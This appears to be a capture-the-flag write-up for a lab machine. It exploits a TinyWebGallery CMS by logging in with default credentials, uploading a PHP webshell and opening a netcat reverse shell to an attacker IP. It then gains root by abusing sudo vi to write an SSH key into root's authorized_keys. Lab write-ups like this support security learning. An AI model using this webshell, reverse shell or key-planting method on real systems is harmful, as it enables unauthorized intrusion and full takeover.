### Exploitation
There is only a web page running on port tcp-80, the CMS apparently is TinyWebGallery:
![](/assets/img/Pasted-image-20250220185641.png)

There is an exploit for this CMS to exploit it [TinyWebGallery (RCE)](https://www.exploit-db.com/exploits/51443), the steps require authentication, after several attempts and none of the basic default credentials worked, I then started researching about this CMS, I then found this [TinyWebGallery Configuration](https://www.tinywebgallery.com/en/configuration.php):

![](/assets/img/Pasted-image-20250220185949.png)

Once inside, all we need to do is change the password (since it is asking us to do so) and login with the new password, then go to Upload Images, and upload a .phar file , I used this payload for it:
```bash
cat exploit.phar 
<?php system($_REQUEST["cmd"]); ?>
```
Then go to the uploaded phar at `http://10.0.160.238/pictures/exploit.phar` and you'll get a working webshell, all you need to do is start a netcat listener and execute your preferred revshell payload, I used this:
```bash
nc -e /bin/bash 10.10.5.122 1234
```

### Privilege Escalation
For the Privilege Escalation I then proceed to execute the command `sudo -l` and I can execute a script as user root without password:
```bash
www-data@exhibit:/var/www/html/pictures$ sudo -l
Matching Defaults entries for www-data on exhibit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on exhibit:
    (ALL : ALL) NOEXEC: NOPASSWD: /usr/bin/vi vimit
www-data@exhibit:/var/www/html/pictures$ sudo /usr/bin/vi vimit
```
This is not a custom binary, only the `vi` command so we can run it to open a file called `vimit`, if you can execute a vi as root, the fastest way to exploit it is by reading a file and then type `:!sh`, but the NOEXEC configuration on the sudo file makes this not possible, so then I tried by reading files using the following vi command:
```bash
:r /etc/passwd
```  
You'll see that it is possible to read files using this command, also you are able to read `id_dsa` from `/root/.ssh` folder, however it does not work, so all you need to do is try and modify the `/root/.ssh/authorized_keys` by adding your public key into it, first create an id_rsa private key:
```bash
ssh-keygen                     
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/kali/.ssh/id_ed25519): /home/kali/Documents/echoCTF/exhibit/content/id_rsa                       
/home/kali/Documents/echoCTF/exhibit/content/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/Documents/echoCTF/exhibit/content/id_rsa
Your public key has been saved in /home/kali/Documents/echoCTF/exhibit/content/id_rsa.pub
```
Finally copy the content of the id_rsa.pub and paste it on `/root/.ssh/authorized_keys`, to do so, run the sudo file command and then type this command:
```bash
:e /root/.ssh/authorized_keys
```
Once you got your public key onto the authorized_keys file, you'll get access with your generated id_rsa by running the ssh command:
```bash
ssh -i id_rsa root@10.0.160.238
root@exhibit:~# whoami
root
```  

And WE ARE INSIDEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

- Default Credentials for TinyWebGallery (admin:twg_admin) were found on this URL: [TinyWebGallery Configuration](https://www.tinywebgallery.com/en/configuration.php)
  
### Notes

- It's always worth checking the source code for a web app, as the configuration details can sometimes help with further exploitation.
